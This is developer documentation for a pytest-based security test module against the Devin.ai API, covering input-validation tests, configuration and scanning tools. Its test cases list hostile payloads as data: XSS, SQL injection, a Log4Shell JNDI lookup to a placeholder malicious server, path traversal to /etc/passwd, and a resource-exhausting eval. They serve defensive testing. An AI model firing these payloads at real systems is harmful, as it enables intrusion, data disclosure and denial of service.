# Security Testing Module Documentation

## Overview

The security testing module evaluates how well the Devin.ai API protects against security threats and vulnerabilities. It tests input validation, authentication, authorization, and error handling to ensure the API maintains data confidentiality, integrity, and availability.

## Test Files

- `src/tests/security/test_input_validation.py`: Tests API handling of potentially malicious inputs

## Key Metrics

- **Input Validation**: How well the API validates and sanitizes inputs
- **Authentication**: How well the API verifies user identity
- **Authorization**: How well the API controls access to resources
- **Error Handling**: How well the API handles errors without exposing sensitive information
- **Data Protection**: How well the API protects sensitive data

## Test Cases

### Input Validation Tests

The `TestInputValidation` class in `test_input_validation.py` contains tests that evaluate how the API handles potentially malicious inputs:

```python
class TestInputValidation:
    """Test cases for input validation security."""
    
    @pytest.mark.parametrize("payload", [
        {"query": "<script>alert('XSS')</script>"},
        {"query": "'; DROP TABLE users; --"},
        {"query": "${jndi:ldap://malicious-server.com/exploit}"},
        {"query": "../../etc/passwd"},
        {"query": "eval(compile('for i in range(10**9): pass', 'string', 'exec'))"},
    ])
    def test_malicious_input_handling(self, api_client, payload):
        """Test handling of potentially malicious inputs."""
        result = api_client.send_query(**payload)
        
        # The API should not crash or expose sensitive information
        assert result["status_code"] not in (500, 501, 502, 503), \
            "Server error indicates potential vulnerability"
        
        # Response should not contain any raw error messages
        if "data" in result:
            response_text = str(result["data"]).lower()
            for keyword in ["exception", "error:", "stacktrace", "traceback", "syntax error"]:
                assert keyword not in response_text, \
                    f"Response contains error information: {keyword}"
    
    def test_large_input(self, api_client):
        """Test handling of extremely large inputs."""
        large_query = "a" * (10 * 1024 * 1024)  # 10MB string
        result = api_client.send_query(query=large_query)
        
        # API should handle large inputs gracefully (reject with 413 or process normally)
        assert result["status_code"] in (200, 413), \
            f"Unexpected status code for large input: {result['status_code']}"
```

## Configuration

Security tests use the following configuration parameters from `src/config/config.py`:

```python
DEFAULT_CONFIG = {
    "security": {
        "scan_timeout_seconds": 300,        # Timeout for security scans
        "csrf_protection_enabled": True,    # Whether CSRF protection should be enabled
        "input_validation_level": "strict", # Level of input validation (strict, moderate, lenient)
    },
    # ... other configuration sections
}
```

## Running Security Tests

To run all security tests:

```bash
pytest src/tests/security/
```

To run a specific security test:

```bash
pytest src/tests/security/test_input_validation.py::TestInputValidation::test_malicious_input_handling
```

### Additional Security Tools

The framework integrates with several security tools:

1. **Bandit**: Static code analysis for Python security issues

   ```bash
   bandit -r src/
   ```

2. **Safety**: Checks Python dependencies for known vulnerabilities

   ```bash
   safety check -r requirements.txt
   ```

3. **OWASP ZAP** (if available): Dynamic application security testing

   ```bash
   python -m src.tests.security.zap_scanner --target=https://api.devin.ai
   ```

## Interpreting Results

Security test results include:

- **Pass/Fail Status**: Whether the API passed security tests
- **Vulnerability Details**: Information about identified vulnerabilities
- **Severity Ratings**: High, medium, or low severity for each issue
- **Remediation Suggestions**: Recommendations for fixing security issues

## Security Best Practices

When extending the security tests, follow these best practices:

1. **Never Include Real Credentials**: Use dummy credentials for testing
2. **Isolate Tests**: Run security tests in isolated environments
3. **Limit Test Scope**: Avoid tests that could impact production systems
4. **Report Responsibly**: Follow responsible disclosure for any vulnerabilities found
5. **Regular Updates**: Keep security tests updated with new attack vectors

## Extending Security Tests

To add new security tests:

1. Create a new test file in the `src/tests/security/` directory
2. Import the necessary modules and fixtures
3. Define test cases that evaluate specific security aspects
4. Assert that the API handles security threats appropriately

Example of a new security test:

```python
def test_authentication_required(api_client_no_auth):
    """Test that authentication is required for protected endpoints."""
    # Create a client without authentication
    result = api_client_no_auth.send_query(query="Test query")
    
    # Assert that the request is rejected with an authentication error
    assert result["status_code"] in (401, 403), \
        f"Expected authentication error, got {result['status_code']}"
```

## Related Modules

- [API Client](./api_client.md): Documentation for the Devin.ai API client used in tests
- [Configuration](./configuration.md): Documentation for the configuration system
